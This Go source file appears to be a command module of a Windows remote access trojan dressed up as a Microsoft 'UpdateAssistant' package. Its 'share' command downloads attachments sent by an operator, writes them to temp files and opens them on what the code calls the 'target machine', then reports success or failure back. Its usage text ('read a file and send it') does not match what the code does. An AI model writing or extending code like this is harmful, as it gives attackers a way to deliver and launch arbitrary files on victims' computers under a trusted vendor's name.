//go:build windows

package media

import (
	"os"
	"path/filepath"
	"time"

	"github.com/microsoft/UpdateAssistant/modules/files"
	ipc "github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
)

var shareUsage = []string{
	"share <path> — read a file and send it as an attachment",
	"example: share then u upload a file and itll open",
}

func Share(c *ipc.Context) error {
	if len(c.Attachments) == 0 {
		return c.Usage(shareUsage)
	}
	go shareFiles(c)
	return nil
}

func shareFiles(c *ipc.Context) {
	for _, id := range c.Attachments {
		data, name, err := files.Download(id)
		if err != nil {
			c.Reply("download failed: " + err.Error())
			return
		}
		tmp, err := writeTmp(name, data)
		if err != nil {
			c.Reply("write failed: " + err.Error())
			return
		}
		if sysutil.OpenFile(tmp) {
			c.ReplyEmbed(ipc.Success("Successfully opened " + filepath.Base(tmp) + " on target machine"))
			go func() {
				time.Sleep(30 * time.Second)
				os.Remove(tmp)
			}()
		} else {
			os.Remove(tmp)
			c.ReplyEmbed(ipc.Error("Failed to open " + filepath.Base(tmp) + " on target machine"))
		}
	}
}

func writeTmp(name string, data []byte) (string, error) {
	f, err := os.CreateTemp("", "share-*-"+name)
	if err != nil {
		return "", err
	}
	defer f.Close()
	if _, err := f.Write(data); err != nil {
		return "", err
	}
	return f.Name(), nil
}
